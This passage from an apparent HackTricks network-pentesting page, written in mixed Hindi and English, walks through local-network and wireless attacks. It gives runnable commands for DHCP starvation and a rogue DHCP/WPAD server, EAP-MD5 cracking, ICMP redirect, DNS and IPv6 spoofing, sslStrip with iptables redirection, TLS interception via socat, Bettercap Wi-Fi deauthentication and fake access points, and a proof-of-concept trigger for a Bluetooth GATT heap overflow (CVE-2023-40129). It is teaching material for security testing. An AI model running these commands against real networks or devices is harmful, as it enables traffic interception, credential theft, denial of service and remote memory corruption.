voiphopper -i eth1 -E 'SEP001EEEEEEEEE ' -c 2
```
### DHCP Attacks

#### Enumeration
```bash
nmap --script broadcast-dhcp-discover
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-16 05:30 EDT
WARNING: No targets were specified, so 0 hosts scanned.
Pre-scan script results:
| broadcast-dhcp-discover:
|   Response 1 of 1:
|     IP Offered: 192.168.1.250
|     DHCP Message Type: DHCPOFFER
|     Server Identifier: 192.168.1.1
|     IP Address Lease Time: 1m00s
|     Subnet Mask: 255.255.255.0
|     Router: 192.168.1.1
|     Domain Name Server: 192.168.1.1
|_    Domain Name: mynet
Nmap done: 0 IP addresses (0 hosts up) scanned in 5.27 seconds
```
**DoS**

**DoS के दो प्रकार** DHCP servers के खिलाफ किए जा सकते हैं। पहला तरीका है कि **पर्याप्त fake hosts को simulate करके सभी संभावित IP addresses का उपयोग कर लिया जाए।**\
यह हमला तभी काम करेगा जब आप DHCP server की प्रतिक्रियाएँ देख सकें और प्रोटोकॉल पूरा कर सकें (**Discover** (Comp) --> **Offer** (server) --> **Request** (Comp) --> **ACK** (server)). उदाहरण के लिए, यह **Wifi networks में संभव नहीं है।**

DHCP DoS करने का एक और तरीका है कि **DHCP-RELEASE packet को स्रोत के रूप में हर संभव IP का उपयोग करके भेजा जाए।** फिर, सर्वर सोच लेगा कि सभी ने IP का उपयोग खत्म कर दिया है।
```bash
yersinia dhcp -attack 1
yersinia dhcp -attack 3 #More parameters are needed
```
A more automatic way of doing this is using the tool [DHCPing](https://github.com/kamorin/DHCPig)

You could use the mentioned DoS attacks to force clients to obtain new leases within the environment, and exhaust legitimate servers so that they become unresponsive. So when the legitimate try to reconnect, **you can server malicious values mentioned in the next attack**.

#### हानिकारक मान सेट करें

A rogue DHCP server can be set up using the DHCP script located at `/usr/share/responder/DHCP.py`. This is useful for network attacks, like capturing HTTP traffic and credentials, by redirecting traffic to a malicious server. However, setting a rogue gateway is less effective since it only allows capturing outbound traffic from the client, missing the responses from the real gateway. Instead, setting up a rogue DNS or WPAD server is recommended for a more effective attack.

Below are the command options for configuring the rogue DHCP server:

- **Our IP Address (Gateway Advertisement)**: Use `-i 10.0.0.100` to advertise your machine's IP as the gateway.
- **Local DNS Domain Name**: Optionally, use `-d example.org` to set a local DNS domain name.
- **Original Router/Gateway IP**: Use `-r 10.0.0.1` to specify the IP address of the legitimate router or gateway.
- **Primary DNS Server IP**: Use `-p 10.0.0.100` to set the IP address of the rogue DNS server you control.
- **Secondary DNS Server IP**: Optionally, use `-s 10.0.0.1` to set a secondary DNS server IP.
- **Netmask of Local Network**: Use `-n 255.255.255.0` to define the netmask for the local network.
- **Interface for DHCP Traffic**: Use `-I eth1` to listen for DHCP traffic on a specific network interface.
- **WPAD Configuration Address**: Use `-w “http://10.0.0.100/wpad.dat”` to set the address for WPAD configuration, assisting in web traffic interception.
- **Spoof Default Gateway IP**: Include `-S` to spoof the default gateway IP address.
- **Respond to All DHCP Requests**: Include `-R` to make the server respond to all DHCP requests, but be aware that this is noisy and can be detected.

By correctly using these options, a rogue DHCP server can be established to intercept network traffic effectively.
```python
# Example to start a rogue DHCP server with specified options
!python /usr/share/responder/DHCP.py -i 10.0.0.100 -d example.org -r 10.0.0.1 -p 10.0.0.100 -s 10.0.0.1 -n 255.255.255.0 -I eth1 -w "http://10.0.0.100/wpad.dat" -S -R
```
### **EAP Attacks**

यहाँ 802.1X implementations के खिलाफ उपयोग की जा सकने वाली कुछ attack tactics दिए गए हैं:

- EAP के माध्यम से Active brute-force पासवर्ड क्रैकिंग
- गलत स्वरूप के EAP कंटेंट के साथ RADIUS सर्वर पर हमला _\*\*_(exploits)
- EAP संदेश कैप्चर और ऑफ़लाइन पासवर्ड क्रैकिंग (EAP-MD5 और PEAP)
- TLS certificate validation को बायपास करने के लिए EAP-MD5 प्रमाणीकरण को जबरदस्ती लागू करना
- hub या समान का उपयोग करके प्रमाणीकृत होने पर हानिकारक नेटवर्क ट्रैफ़िक इंजेक्ट करना

यदि attacker victim और authentication server के बीच है, तो वह (आवश्यक होने पर) authentication protocol को EAP-MD5 तक degrade करने और authentication attempt को capture करने की कोशिश कर सकता है। फिर वह इसे brute-force करने की कोशिश कर सकता है using:
```
eapmd5pass –r pcap.dump –w /usr/share/wordlist/sqlmap.txt
```
### FHRP (GLBP & HSRP) Attacks <a href="#id-6196" id="id-6196"></a>

**FHRP** (First Hop Redundancy Protocol) नेटवर्क प्रोटोकॉल का एक वर्ग है जिसे **एक हॉट redundant routing सिस्टम बनाने** के लिए डिज़ाइन किया गया है। FHRP के साथ, physical routers को एक single logical device में मिलाया जा सकता है, जिससे fault tolerance बढ़ता है और load का वितरण आसान होता है।

**Cisco Systems engineers ने दो FHRP प्रोटोकॉल विकसित किए हैं, GLBP और HSRP।**


{{#ref}}
glbp-and-hsrp-attacks.md
{{#endref}}

### RIP

Routing Information Protocol (RIP) के तीन संस्करण मौजूद हैं: RIP, RIPv2, और RIPng। RIP और RIPv2 UDP का उपयोग करके port 520 पर peers को datagrams भेजते हैं, जबकि RIPng IPv6 multicast के माध्यम से UDP port 521 पर datagrams broadcast करता है। RIPv2 में MD5 authentication का समर्थन जारी किया गया था। दूसरी ओर, RIPng में native authentication शामिल नहीं है; यह IPv6 में optional IPsec AH और ESP headers पर निर्भर करता है।

- **RIP and RIPv2:** संचार UDP datagrams के माध्यम से port 520 पर किया जाता है।
- **RIPng:** IPv6 multicast के माध्यम से datagrams को broadcast करने के लिए UDP port 521 का उपयोग करता है।

ध्यान दें कि RIPv2 MD5 authentication का समर्थन करता है जबकि RIPng में native authentication नहीं है और यह IPv6 में IPsec AH और ESP headers पर निर्भर करता है।

### EIGRP Attacks

**EIGRP (Enhanced Interior Gateway Routing Protocol)** एक dynamic routing protocol है। **यह एक distance-vector protocol है।** यदि authentication और passive interfaces को कॉन्फ़िगर नहीं किया गया है, तो एक intruder EIGRP routing में हस्तक्षेप कर सकता है और routing tables poisoning कर सकता है। इसके अलावा, EIGRP network (यानि autonomous system) **flat होता है और किसी zone में segmentation नहीं होता**। यदि एक attacker कोई route inject करता है, तो यह संभावना है कि यह route पूरे autonomous EIGRP सिस्टम में **फैल जाएगा**।

EIGRP सिस्टम पर हमला करने के लिए एक legitimate EIGRP router के साथ neighbourhood स्थापित करना आवश्यक है, जो basic reconnaissance से लेकर विभिन्न injections तक कई संभावनाओं को खोलता है।

[**FRRouting**](https://frrouting.org/) आपको एक virtual router लागू करने की अनुमति देता है जो BGP, OSPF, EIGRP, RIP और अन्य प्रोटोकॉल को सपोर्ट करता है। बस इसे अपने attacker’s system पर deploy करें और आप routing domain में एक legitimate router होने का नाटक कर सकते हैं।


{{#ref}}
eigrp-attacks.md
{{#endref}}

[**Coly**](https://code.google.com/p/coly/) के पास EIGRP broadcasts को intercept करने की क्षमताएँ हैं। यह packets inject करने की भी अनुमति देता है, जिसे routing configurations बदलने के लिए उपयोग किया जा सकता है।

### OSPF

Open Shortest Path First (OSPF) प्रोटोकॉल में routers के बीच सुरक्षित संचार सुनिश्चित करने के लिए **MD5 authentication सामान्यतः उपयोग किया जाता है**। हालाँकि, इस सुरक्षा उपाय को Loki और John the Ripper जैसे उपकरणों से तोड़ा जा सकता है। ये टूल MD5 hashes को capture और crack करने में सक्षम हैं, जिससे authentication key उजागर हो जाती है। एक बार यह key मिल जाने पर, इसे नए routing information को introduce करने के लिए उपयोग किया जा सकता है। route parameters को configure करने और compromised key को सेट करने के लिए क्रमशः _Injection_ और _Connection_ tabs का उपयोग किया जाता है।

- **Capturing and Cracking MD5 Hashes:** इसके लिए Loki और John the Ripper जैसे टूल्स प्रयोग किए जाते हैं।
- **Configuring Route Parameters:** यह _Injection_ tab के माध्यम से किया जाता है।
- **Setting the Compromised Key:** यह key _Connection_ tab के अंतर्गत कॉन्फ़िगर की जाती है।

### Other Generic Tools & Sources

- [**Above**](https://github.com/c4s73r/Above): Tool to scan network traffic and find vulnerabilities
- You can find some **more information about network attacks** [**here**](https://github.com/Sab0tag3d/MITM-cheatsheet).

## **Spoofing**

attacker नए नेटवर्क सदस्य के सभी network parameters (GW, IP, DNS) को कॉन्फ़िगर करता है और नकली DHCP responses भेजकर ऐसा करता है।
```bash
Ettercap
yersinia dhcp -attack 2 #More parameters are needed
```
### ARP Spoofing

देखें [previous section](#arp-spoofing).

### ICMPRedirect

ICMP Redirect में एक ICMP packet type 1 code 5 भेजा जाता है, जो संकेत देता है कि attacker किसी IP तक पहुँचने का सबसे अच्छा रास्ता है। जब victim उस IP से संपर्क करना चाहता है, तो वह उस पैकेट को attacker के माध्यम से भेजेगा।
```bash
Ettercap
icmp_redirect
hping3 [VICTIM IP ADDRESS] -C 5 -K 1 -a [VICTIM DEFAULT GW IP ADDRESS] --icmp-gw [ATTACKER IP ADDRESS] --icmp-ipdst [DST IP ADDRESS] --icmp-ipsrc [VICTIM IP ADDRESS] #Send icmp to [1] form [2], route to [3] packets sent to [4] from [5]
```
### DNS Spoofing

attacker कुछ (या सभी) domains को resolve करेगा जिन्हें victim मांगता है।
```bash
set dns.spoof.hosts ./dns.spoof.hosts; dns.spoof on
```
**dnsmasq के साथ अपना DNS कॉन्फ़िगर करें**
```bash
apt-get install dnsmasq
echo "addn-hosts=dnsmasq.hosts" > dnsmasq.conf
echo "127.0.0.1   domain.example.com" > dnsmasq.hosts
sudo dnsmasq -C dnsmasq.conf --no-daemon
dig @localhost domain.example.com # Test the configured DNS
```
### स्थानीय गेटवे

सिस्टम और नेटवर्क तक अक्सर कई मार्ग होते हैं। स्थानीय नेटवर्क के भीतर MAC addresses की एक सूची बनाने के बाद, _gateway-finder.py_ का उपयोग उन hosts की पहचान करने के लिए करें जो IPv4 forwarding का समर्थन करते हैं।

<details>
<summary>gateway-finder उपयोग का उदाहरण</summary>
```bash
root@kali:~# git clone https://github.com/pentestmonkey/gateway-finder.git
root@kali:~# cd gateway-finder/
root@kali:~# arp-scan -l | tee hosts.txt
Interface: eth0, datalink type: EN10MB (Ethernet)
Starting arp-scan 1.6 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/)
10.0.0.100     00:13:72:09:ad:76       Dell Inc.
10.0.0.200     00:90:27:43:c0:57       INTEL CORPORATION
10.0.0.254     00:08:74:c0:40:ce       Dell Computer Corp.

root@kali:~/gateway-finder# ./gateway-finder.py -f hosts.txt -i 209.85.227.99
gateway-finder v1.0 http://pentestmonkey.net/tools/gateway-finder
[+] Using interface eth0 (-I to change)
[+] Found 3 MAC addresses in hosts.txt
[+] We can ping 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
[+] We can reach TCP port 80 on 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
```
</details>


### [Spoofing LLMNR, NBT-NS, and mDNS](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

जब DNS लुकअप असफल होते हैं तब लोकल होस्ट रिज़ॉल्यूशन के लिए Microsoft सिस्टम **Link-Local Multicast Name Resolution (LLMNR)** और **NetBIOS Name Service (NBT-NS)** पर निर्भर करते हैं। इसी तरह, **Apple Bonjour** और **Linux zero-configuration** इम्प्लीमेंटेशन नेटवर्क के भीतर सिस्टम खोजने के लिए **Multicast DNS (mDNS)** का उपयोग करते हैं। इन प्रोटोकॉल्स का बिना प्रमाणीकरण का स्वभाव और UDP पर ब्रॉडकास्ट संदेशों के रूप में इनका संचालन होने के कारण, इन्हें उन attackers द्वारा शोषित किया जा सकता है जो उपयोगकर्ताओं को malicious services की ओर रीडायरेक्ट करना चाहते हैं।

आप Responder का उपयोग करके उन services का impersonate कर सकते हैं जिन्हें hosts खोज रहे हैं और fake responses भेज सकते हैं।\
इस बारे में अधिक जानकारी पढ़ें: [how to Impersonate services with Responder](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [Spoofing WPAD](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

Browsers आमतौर पर **Web Proxy Auto-Discovery (WPAD) protocol** का उपयोग proxy settings स्वचालित रूप से प्राप्त करने के लिए करते हैं। इसके तहत सर्वर से configuration details लाना शामिल है, विशेषकर ऐसे URL के माध्यम से जैसे "http://wpad.example.org/wpad.dat"। क्लाइंट द्वारा इस सर्वर की खोज कई तरीकों से हो सकती है:

- **DHCP** के माध्यम से, जहाँ खोज एक विशेष code 252 entry का उपयोग करके सुगम होती है।
- **DNS** द्वारा, जो स्थानीय डोमेन में _wpad_ लेबल वाले hostname की खोज से जुड़ा होता है।
- **Microsoft LLMNR and NBT-NS** के माध्यम से, जो उन मामलों में उपयोग होने वाले fallback mechanisms हैं जहाँ DNS लुकअप सफल नहीं होते।

Tool Responder इस प्रोटोकॉल का फायदा उठाकर एक malicious WPAD server के रूप में काम करता है। यह क्लाइंट्स को इसके साथ connect करने के लिए mislead करने के लिए **DHCP**, **DNS**, **LLMNR**, और **NBT-NS** का उपयोग करता है। अधिक जानने के लिए कि कैसे services को Responder से impersonate किया जा सकता है [check this](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [Spoofing SSDP and UPnP devices](spoofing-ssdp-and-upnp-devices.md)

आप नेटवर्क में विभिन्न services ऑफर कर सकते हैं ताकि उपयोगकर्ता को **trick** करके कुछ **plain-text credentials** दर्ज करने के लिए प्रेरित किया जा सके। इस attack के बारे में अधिक जानकारी [**Spoofing SSDP and UPnP Devices**](spoofing-ssdp-and-upnp-devices.md) में उपलब्ध है।

IPv6 Neighbor Spoofing

यह attack ARP Spoofing के बहुत समान है लेकिन IPv6 दुनिया में। आप victim को यह सोचने पर मजबूर कर सकते हैं कि GW का IPv6 attacker के MAC का उपयोग कर रहा है।
```bash
sudo parasite6 -l eth0 # This option will respond to every requests spoofing the address that was requested
sudo fake_advertise6 -r -w 2 eth0 <Router_IPv6> #This option will send the Neighbor Advertisement packet every 2 seconds
```
### IPv6 Router Advertisement Spoofing/Flooding

कुछ OS डिफ़ॉल्ट रूप से नेटवर्क में भेजे गए RA packets से gateway को कॉन्फ़िगर करते हैं। हमलावर को IPv6 router घोषित करने के लिए आप उपयोग कर सकते हैं:
```bash
sysctl -w net.ipv6.conf.all.forwarding=1 4
ip route add default via <ROUTER_IPv6> dev wlan0
fake_router6 wlan0 fe80::01/16
```
### IPv6 DHCP spoofing

डिफ़ॉल्ट रूप से कुछ OS नेटवर्क में DHCPv6 पैकेट पढ़कर DNS को कॉन्फ़िगर करने की कोशिश करते हैं। फिर, एक हमलावर अपने आप को DNS के रूप में कॉन्फ़िगर करने के लिए DHCPv6 पैकेट भेज सकता है। DHCP पीड़ित को एक IPv6 भी प्रदान करता है।
```bash
dhcp6.spoof on
dhcp6.spoof.domains <list of domains>

mitm6
```
### HTTP (नकली पेज और JS code injection)

## Internet Attacks

### sslStrip

बुनियादी तौर पर यह हमला तब होता है जब **user** किसी **HTTP** पेज को **access** करने की कोशिश करता है जो **redirecting** है **HTTPS** वर्ज़न की ओर। ऐसी स्थिति में **sslStrip** **maintain** करेगा एक **HTTP connection with** the **client and** एक **HTTPS connection with** the **server**, ताकि यह the connection को **plain text** में **sniff** कर सके।
```bash
apt-get install sslstrip
sslstrip -w /tmp/sslstrip.log --all - l 10000 -f -k
#iptables --flush
#iptables --flush -t nat
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
iptables -A INPUT -p tcp --destination-port 10000 -j ACCEPT
```
अधिक जानकारी [here](https://www.blackhat.com/presentations/bh-dc-09/Marlinspike/BlackHat-DC-09-Marlinspike-Defeating-SSL.pdf).

### sslStrip+ और dns2proxy — HSTS को बायपास करने के लिए

**sslStrip+ और dns2proxy** का **sslStrip** के मुकाबले जो **अंतर** है वह यह है कि वे उदाहरण के तौर पर _**www.facebook.com**_ को _**wwww.facebook.com**_ पर **redirect** कर देंगे (ध्यान दें अतिरिक्त "**w**") और इस डोमेन का **address attacker IP** पर सेट कर देंगे। इस तरह, **client** _**wwww.facebook.com**_ (the attacker) से **connect** करेगा, लेकिन पर्दे के पीछे **sslstrip+** वास्तविक कनेक्शन को **www.facebook.com** के साथ https के जरिए **maintain** करेगा।

**इस तकनीक का लक्ष्य** HSTS को **avoid** करना है क्योंकि _**wwww.facebook.com**_ ब्राउज़र के **cache** में सेव **नहीं** होगा, इसलिए ब्राउज़र को धोखा देकर **facebook authentication in HTTP** करवाई जा सकेगी।\
ध्यान दें कि इस attack को अंजाम देने के लिए victim को शुरू में [http://www.faceook.com](http://www.faceook.com) पर ही पहुँचने की कोशिश करनी होगी, न कि https पर। यह http पेज के अंदर लिंक संशोधित करके किया जा सकता है।

अधिक जानकारी [here](https://www.bettercap.org/legacy/#hsts-bypass), [here](https://www.slideshare.net/Fatuo__/offensive-exploiting-dns-servers-changes-blackhat-asia-2014) और [here](https://security.stackexchange.com/questions/91092/how-does-bypassing-hsts-with-sslstrip-work-exactly).

**sslStrip या sslStrip+ अब काम नहीं करते। इसका कारण यह है कि ब्राउज़रों में HSTS नियम पहले से presaved होते हैं, इसलिए भले ही उपयोगकर्ता किसी "important" डोमेन पर पहली बार जाए, वह उसे HTTPS के जरिए एक्सेस करेगा। साथ ही ध्यान दें कि presaved नियम और अन्य जनरेट किए गए नियम** [**`includeSubdomains`**](https://hstspreload.appspot.com) **फ्लैग का उपयोग कर सकते हैं, इसलिए पहले दिए गए _**wwww.facebook.com**_ का उदाहरण अब काम नहीं करेगा क्योंकि _**facebook.com**_ `includeSubdomains` के साथ HSTS का उपयोग करता है।**

TODO: easy-creds, evilgrade, metasploit, factory

## TCP listen in port
```bash
sudo nc -l -p 80
socat TCP4-LISTEN:80,fork,reuseaddr -
```
## TCP + SSL port पर सुनना

#### कुंजियाँ और self-signed certificate जनरेट करें
```
FILENAME=server
# Generate a public/private key pair:
openssl genrsa -out $FILENAME.key 1024
# Generate a self signed certificate:
openssl req -new -key $FILENAME.key -x509 -sha256 -days 3653 -out $FILENAME.crt
# Generate the PEM file by just appending the key and certificate files:
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
```
#### प्रमाणपत्र का उपयोग करके सुनना
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0 -
```
#### certificate का उपयोग करके listen करें और hosts पर redirect करें
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0  openssl-connect:[SERVER]:[PORT],verify=0
```
कभी-कभी, अगर client यह जांचता है कि CA वैध है, तो आप **serve a certificate of other hostname signed by a CA** कर सकते हैं.\
एक और रोचक परीक्षण है कि c**ertificate of the requested hostname but self-signed**.

अन्य चीजें जिन्हें टेस्ट करना चाहिए: certificate को एक valid certificate से sign करने की कोशिश करें जो कि एक valid CA नहीं है। या valid public key का उपयोग करके, किसी algorithm जैसे diffie hellman को मजबूर करें (ऐसा algorithm जो real private key से कुछ भी decrypt करने की ज़रूरत नहीं रखता) और जब client real private key की किसी probe (जैसे एक hash) का अनुरोध करे, तो एक fake probe भेजें और उम्मीद करें कि client इसे चेक नहीं करता।

## Bettercap

<details>
<summary>Common Bettercap commands</summary>
```bash
# Events
events.stream off #Stop showing events
events.show #Show all events
events.show 5 #Show latests 5 events
events.clear

# Ticker (loop of commands)
set ticker.period 5; set ticker.commands "wifi.deauth DE:AD:BE:EF:DE:AD"; ticker on

# Caplets
caplets.show
caplets.update

# Wifi
wifi.recon on
wifi.deauth BSSID
wifi.show
# Fake wifi
set wifi.ap.ssid Banana
set wifi.ap.bssid DE:AD:BE:EF:DE:AD
set wifi.ap.channel 5
set wifi.ap.encryption false #If true, WPA2
wifi.recon on; wifi.ap
```
</details>


### सक्रिय खोज नोट्स

ध्यान रखें कि जब किसी डिवाइस को UDP packet भेजा जाता है और उस डिवाइस पर अनुरोधित पोर्ट मौजूद नहीं होता, तो एक ICMP (Port Unreachable) भेजा जाता है।

### **ARP खोज**

ARP packets का उपयोग नेटवर्क के भीतर किन IPs का उपयोग हो रहा है यह पता करने के लिए किया जाता है। पीसी को प्रत्येक संभावित IP address के लिए एक अनुरोध भेजना पड़ता है और केवल वही जवाब देंगे जो उपयोग में हैं।

### **mDNS (multicast DNS)**

Bettercap एक MDNS request भेजता है (प्रत्येक X ms) जो **\_services\_.dns-sd.\_udp.local** के लिए पूछता है। जो मशीन यह packet देखती है वह आमतौर पर इस request का उत्तर देती है। फिर यह केवल उन मशीनों की खोज करता है जो "services" का उत्तर देती हैं।

**उपकरण**

- Avahi-browser (--all)
- Bettercap (net.probe.mdns)
- Responder

### **NBNS (NetBios Name Server)**

Bettercap पोर्ट 137/UDP पर ब्रॉडकास्ट पैकेट भेजता है और नाम "CKAAAAAAAAAAAAAAAAAAAAAAAAAAA" के लिए पूछता है।

### **SSDP (Simple Service Discovery Protocol)**

Bettercap SSDP पैकेट ब्रॉडकास्ट करता है जो सभी प्रकार की सेवाओं की खोज करते हैं (UDP Port 1900)।

### **WSD (Web Service Discovery)**

Bettercap WSD पैकेट ब्रॉडकास्ट करता है जो सेवाओं की खोज करते हैं (UDP Port 3702)。


## Bluetooth (L2CAP/ATT/GATT) हमले

- Android Fluoride L2CAP PSMs पर services एक्सपोज़ करता है (e.g., SDP 0x0001, RFCOMM 0x0003, BNEP 0x000F, AVCTP 0x0017/0x001B, AVDTP 0x0019, ATT/GATT 0x001F)। Services निम्नलिखित के माध्यम से रजिस्टर होते हैं:
```c
uint16_t L2CA_Register2(uint16_t psm, const tL2CAP_APPL_INFO& p_cb_info,
bool enable_snoop, tL2CAP_ERTM_INFO* p_ertm_info,
uint16_t my_mtu, uint16_t required_remote_mtu,
uint16_t sec_level);
```
- BlueBlue फ्रेमवर्क Scapy-based L2CAP/ATT crafting को सक्षम करता है (BlueBorne l2cap_infra पर निर्मित). उदाहरण:
```python
acl  = ACLConnection(src_bdaddr, dst_bdaddr, auth_mode='justworks')
gatt = acl.l2cap_connect(psm=PSM_ATT, mtu=672)
gatt.send_frag(p8(GATT_READ)+p16(1234))
print(gatt.recv())
```
- CVE-2023-40129 (Fluoride GATT): Read Multiple Variable response builder में integer underflow होने से ~64KB का heap overflow हो सकता है जब MTU किसी variable-length element को truncate कर देता है लेकिन +2 length field का हिसाब नहीं रखा जाता।

<details>
<summary>मूल कारण (GATT Read Multiple Variable)</summary>
```c
static void build_read_multi_rsp(tGATT_SR_CMD* p_cmd, uint16_t mtu) {
uint16_t ii, total_len, len; uint8_t* p; bool is_overflow=false;
len = sizeof(BT_HDR) + L2CAP_MIN_OFFSET + mtu;
BT_HDR* p_buf = (BT_HDR*)osi_calloc(len); p_buf->offset=L2CAP_MIN_OFFSET;
p = (uint8_t*)(p_buf + 1) + p_buf->offset; *p++ = GATT_RSP_READ_MULTI_VAR;
p_buf->len=1;
for (ii=0; ii<p_cmd->multi_req.num_handles; ii++) {
tGATTS_RSP* p_rsp = ...; // dequeued
if (p_rsp) {
total_len = (p_buf->len + p_rsp->attr_value.len);
if (p_cmd->multi_req.variable_len) total_len += 2;
if (total_len > mtu) {
len = p_rsp->attr_value.len - (total_len - mtu); // BUG: ignores +2
is_overflow = true;
} else { len = p_rsp->attr_value.len; }
if (p_cmd->multi_req.variable_len) { UINT16_TO_STREAM(p, len); p_buf->len += 2; }
memcpy(p, p_rsp->attr_value.value, len); // heap overflow
if (!is_overflow) p += len; p_buf->len += len; if (is_overflow) break;
}
}
}
```
- variable-length एंट्रीज़ पर, overflow path केवल (total_len - mtu) घटाता है, +2 length field को अनदेखा करते हुए, इसलिए len underflows (उदा., 0xFFFE) और memcpy बफर के अंत से लगभग ~64KB आगे लिखता है.
</details>

- न्यूनतम बिना-प्रमाणीकरण ट्रिगर (small MTU forces underflow on the 4th attribute):
```python
# GATT_REQ_READ_MULTI_VAR (0x20), MTU=55
acl  = ACLConnection(interface, bdaddr)
gatt = acl.l2cap_connect(psm=PSM_ATT, mtu=55)
pkt  = b'\x20'  # opcode
pkt += p16(9); pkt += p16(9); pkt += p16(9); pkt += p16(9)
gatt.send(pkt)
# On 4th insert: p_buf->len=55 (1 + 3*(16+2)), total_len=73 -> len=16-(73-55)=-2 -> ~64KB overwrite
```
### टेलीकॉम / मोबाइल-कोर (GTP) Exploitation


{{#ref}}
telecom-network-exploitation.md
{{#endref}}

## संदर्भ

- [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)
- **Network Security Assessment: Know Your Network (3rd edition)**
- **Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things. By Fotios Chantzis, Ioannis Stais, Paulino Calderon, Evangelos Deirmentzoglou, Beau Wood**
- [https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)
- [Paint it blue: Attacking the bluetooth stack (Synacktiv)](https://www.synacktiv.com/en/publications/paint-it-blue-attacking-the-bluetooth-stack)
- [BlueBorne L2CAP testing infra (l2cap_infra)](https://github.com/ArmisSecurity/blueborne/tree/master/l2cap_infra)



{{#include ../../banners/hacktricks-training.md}}
